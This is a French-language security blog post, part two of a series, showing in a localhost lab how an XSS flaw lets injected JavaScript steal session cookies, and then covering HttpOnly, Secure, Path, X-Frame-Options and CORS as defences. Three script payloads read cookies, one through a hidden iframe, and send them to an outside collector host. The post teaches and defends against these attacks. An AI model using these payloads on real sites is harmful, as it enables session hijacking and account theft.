<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      XSS, CORS, CSRF (Partie 2) &middot; Lanyon
    
  </title>

  
  <link rel="canonical" href="http://localhost:4000/web/2016/08/15/xss-cors-csrf-partie-2-xss-cookies-session/">
  

  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">

  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">

  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">

  
</head>


  <body>

    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
     styles, `#sidebar-checkbox` for behavior. -->
<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>

<!-- Toggleable sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-item">
    <p>A reserved <a href="https://jekyllrb.com" target="_blank">Jekyll</a> theme that places the utmost gravity on content with a hidden drawer. Made by <a href="https://twitter.com/mdo" target="_blank">@mdo</a>.</p>
  </div>

  <nav class="sidebar-nav">
    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>

    

    
    
      
        
      
    
      
        
      
    
      
        
          <a class="sidebar-nav-item" href="http://localhost:4000/about/">About</a>
        
      
    
      
    
      
    
      
        
      
    
      
        
      
    
      
        
      
    
      
        
      
    
      
        
      
    

    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
    <a class="sidebar-nav-item" href="">GitHub project</a>
    <span class="sidebar-nav-item">Currently v1.1.0</span>
  </nav>

  <div class="sidebar-item">
    <p>
      &copy; 2020. All rights reserved.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">Lanyon</a>
            <small>A Jekyll theme</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="post">
  <h1 class="post-title">XSS, CORS, CSRF (Partie 2)</h1>
  <span class="post-date">15 Aug 2016</span>
  <h2 id="xss--et-vol-de-cookies-par-la-pratique">XSS  et vol de cookies par la pratique.</h2>

<p><strong>Vous reprendrez bien un cookie ?</strong></p>

<p>Dans le <a href="http://localhost:4000/xss-cors-csrf-partie-1-xss">premier volet</a> de notre saga, nous traitions des attaques XSS et des moyens de s’en prémunir. Ces vulnérabilités peuvent être utilisées pour voler vos informations de session ou vous rediriger vers un site frauduleux. Vous vous dîtes sûrement : “ok coco en théorie c’est bien sympa tout ça, mais en quoi consiste le vol d’une session, quelles informations sont envoyées et où part la requête ?”.</p>

<p>Imaginons la configuration suivante :</p>

<p><img src="http://localhost:4000/public/images/xss-cors-csrf/cors_1.png" alt="Configuration de l'attaque" /></p>

<p>Un internaute requête le site <em>www.site-a.com</em> qui est un site de confiance mais vulnérable au XSS. Un pirate pourra injecter le code suivant :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Juste un petit coucou !
<span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://requestb.in/w7iy5sw7?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">encodeURI</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">));</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Pour notre test nous partirons sur le postulat que <em>www.site-a.com</em> est notre <em>localhost</em>, et que <em>www.site-b.com</em> (le site du pirate qui récupère les infos) correspond au site <em>http://requestb.in</em>.</p>

<blockquote>
  <p>Le site <strong>http://requestb.in</strong> est très utile pour analyser les requêtes HTTP.</p>
</blockquote>

<p>Lorsque le script est exécuté, ce dernier accède au <strong>document.cookie</strong> qui correspond au cookie du document HTML courant contenant l’id de session. Ce dernier peut ressembler à ceci :</p>

<p><img src="http://localhost:4000/public/images/xss-cors-csrf/cors_2.png" alt="Exemple cookie 1" /><br />
Ou bien ceci :</p>

<p><img src="http://localhost:4000/public/images/xss-cors-csrf/cors_3.png" alt="Exemple cookie 2" /><br />
Nous reviendrons sur ce dernier cas par la suite car ce dernier est un cookie sécurisé. Je vous recommande sous Chrome d’installer l’extension <a href="https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn">Cookie Inspector</a>.</p>

<p>Pour nos tests voici la configuration mise en place :</p>

<ul>
  <li>Une page <em>http://localhost/secu/cookie.php</em>:</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'PHPSESSID_secure'</span><span class="p">,</span> <span class="s1">'jm5mah0a9uuf4g344096nled73'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">'/secu'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">],</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"HTTPS"</span><span class="p">]),</span> <span class="kc">true</span><span class="p">);</span>
	<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'PHPSESSID_unsecured'</span><span class="p">,</span> <span class="s1">'jm5mah0a9uuf4g344096nled73'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">],</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<blockquote>
  <p>Vous ne pouvez pas définir de cookie pour un autre domaine.</p>
</blockquote>

<p>Les cookies générés (deux cookies à des fins de test):<br />
<img src="http://localhost:4000/public/images/xss-cors-csrf/cors_4.png" alt="Configuration cookies test" /><br />
Les champs <a href="https://tools.ietf.org/html/rfc6265">Domain, Path, HTTP et Secure</a> sont les champs qui permettront de sécuriser notre cookie:</p>

<p><strong>domain</strong> : le domaine racine concerné par le cookie<br />
<strong>path</strong> : détermine pour quelle arborescence à partir du domaine racine le cookie sera accessible<br />
<strong>session.cookie_httponly</strong> : empêche un cookie d’être accessible via javascript (XSS ;))<br />
<strong>session.cookie_secure</strong> : accède au cookie uniquement sur des connexions HTTPS (empêche les informations de transiter en clair – voir également la solution <a href="https://developer.mozilla.org/fr/docs/S%C3%A9curit%C3%A9/HTTP_Strict_Transport_Security">HSTS</a>)</p>

<ul>
  <li>Une page vulnérable <em>http://localhost/xss.php</em> qui contient le payload vu précédemment.</li>
</ul>

<p>Ce cookie est envoyé via une requête <strong>XMLHttpRequest</strong> sur <em>requestb.in</em>. Regardons quelles informations sont réceptionnées :<br />
<img src="http://localhost:4000/public/images/xss-cors-csrf/cors_5.png" alt="Requestb.in get data" /></p>

<p>Nous récupérons bien l’id de session de notre cookie non sécurisé uniquement. Ceci a été possible car :</p>

<ul>
  <li>Faille <strong>XSS</strong> ayant permis l’injection de javascript</li>
  <li>Cookie avec le flag <strong>HttpOnly</strong> à false</li>
  <li>Requête <strong>Cross-Origin</strong> simple sur le site du pirate pour récupération des informations</li>
  <li>Cookie avec un <strong>Path</strong> permissif (toute l’arborescence du site)</li>
</ul>

<p>Il convient de définir un path pour lequel le cookie doit être actif, dans notre exemple un espace sécurisé <em>/secu</em> qui sollicite le cookie session. Ainsi notre page publique vulnérable <em>xss.php</em> à la racine <em>/</em> n’aurait pas été en mesure d’accéder au cookie. Modifions le path de notre cookie unsecured :</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'PHPSESSID_unsecured'</span><span class="p">,</span> <span class="s1">'jm5mah0a9uuf4g344096nled73'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">'/secu'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">],</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
</code></pre></div></div>

<p>Et si maintenant nous tentions dans notre payload (depuis la page <em>http://localhost/xss.php</em>) d’accéder à la page <em>http://localhost/secu/cookie.php</em>, de lui voler son cookie et de nous l’envoyer :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>    
	<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>

		<span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">getResponseHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Set-Cookie</span><span class="dl">'</span><span class="p">);</span>   
				
			<span class="kd">var</span> <span class="nx">xhr2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://requestb.in/w7iy5sw7?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">encodeURI</span><span class="p">(</span><span class="nx">cookie</span><span class="p">),</span> <span class="kc">false</span><span class="p">);</span>
			<span class="nx">xhr2</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
		<span class="p">}</span>
	<span class="p">}</span>	
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://localhost/secu/cookie.php</span><span class="dl">'</span><span class="p">);</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>		  
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Malheureusement nous obtenons : <span style="color: red"><code class="language-plaintext highlighter-rouge">Refused to get unsafe header "Set-Cookie"</code></span>.</p>

<p>La spécification <strong>XMLHttpRequest</strong> interdit l’accès à certains response headers pour des raisons de sécurité. Les navigateurs chrome / firefox / IE retourneront donc null (<a href="https://fetch.spec.whatwg.org/#forbidden-header-name">https://fetch.spec.whatwg.org/#forbidden-header-name</a>).</p>

<p><a name="iframe"></a>N’y-a-t-il pas une autre méthode que notre XHR pour charger cookie.php?</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>    
	<span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost/secu/cookie.php</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">iframe</span><span class="p">.</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>            
	<span class="kd">var</span> <span class="nx">iframeObj</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>

	<span class="nx">iframeObj</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>            
		<span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nx">iframeObj</span><span class="p">.</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
		<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://requestb.in/w7iy5sw7?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">encodeURI</span><span class="p">(</span><span class="nx">cookie</span><span class="p">));</span>
		<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
	<span class="p">};</span>          	  
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Bingo, même avec un path défini pour ce cookie, nous avons pu le récupérer, et si vous avez bien retenu votre leçon dans le <a href="http://localhost:4000/xss-cors-csrf-partie-1-xss">volet 1</a> de notre saga XSS, vous connaissez la contre-mesure à ce payload : le response header <strong>X-Frame-Options</strong> qui interdit qu’une page soit rendue dans un <code class="language-plaintext highlighter-rouge">&lt;frame&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> ou <code class="language-plaintext highlighter-rouge">&lt;object&gt;</code>. Bien évidemment il est préférable en amont de toujours positionner le flag <strong>HttpOnly</strong>. L’accès au cookie par javascript est peu justifiable dans les développements Web.</p>

<blockquote>
  <p><em>“J’ai activé la console de mon navigateur et je remarque cependant un warning:”</em></p>
</blockquote>

<pre class="alert">
XMLHttpRequest cannot load http://requestb.in/w7iy5sw7?cookie=PHPSESSID_unsecured=jm5mah0a9uuf4g344096nled73.  
No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
</pre>

<blockquote>
  <p><em>“Nous requêtons depuis une ressource du domaine http://localhost:80 vers le domaine http://requestb.in:80, et nous avons ce message, comment se fait-il que la requête ait abouti ?”</em></p>
</blockquote>

<p>Et bien je vous remercie d’avoir posé la question :). Nous sommes typiquement dans le cas d’une requête Cross Origin. Aujourd’hui AJAX  est omniprésent dans les développements de par l’essor des frameworks client riches comme AngularJS. Je réserve le détail du <strong>Cross-Origin Resource Sharing</strong> pour le dernier volet de cette saga. La connaissance du CORS est essentielle pour les développeurs WEB.</p>

<p>Imaginez que vous surfiez sur un site frauduleux qui puisse soumettre à votre insu des requêtes sur un de vos sites préférés en incluant vos informations de session et poster des formulaires à votre place… C’est à ce niveau qu’il est essentiel de bien configurer le Cross-Origin Resource Sharing et de définir un <strong>token de sécurité</strong> pour éviter les attaques <strong>Cross-Site Request Forgery</strong>. Ceci nous montre bien que les vecteurs d’attaques sont multiples.</p>

<p>A très bientôt.</p>

<h3 id="partie-3"><a href="https://phackt.com/xss-cors-csrf-partie-3-cors-csrf">PARTIE 3</a></h3>
<p><br />
Références:<br />
<a href="http://php.net/manual/fr/session.security.php">http://php.net/manual/fr/session.security.php</a><br />
<a href="https://geekflare.com/httponly-secure-cookie-apache/">https://geekflare.com/httponly-secure-cookie-apache/</a><br />
<a href="https://fetch.spec.whatwg.org/">https://fetch.spec.whatwg.org/</a><br />
<a href="https://geekflare.com/secure-cookie-flag-in-tomcat/">https://geekflare.com/secure-cookie-flag-in-tomcat/</a></p>

</div>


<div class="related">
  <h2>Related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/dev/2020/05/27/git-secrets-exposed/">
            What solutions to prevent git leaks ?
            <small>27 May 2020</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/web/2018/08/05/web-exposed-git-repositories/">
            Gathering some information from web exposed git repositories
            <small>05 Aug 2018</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/web/2017/12/24/play-with-permissive-cors/">
            Play with permissive CORS
            <small>24 Dec 2017</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>


      </div>
    </div>


    <!-- <label for="sidebar-checkbox" class="sidebar-toggle"></label> -->

    <script src='/public/js/script.js'></script>
 
  </body>
</html>
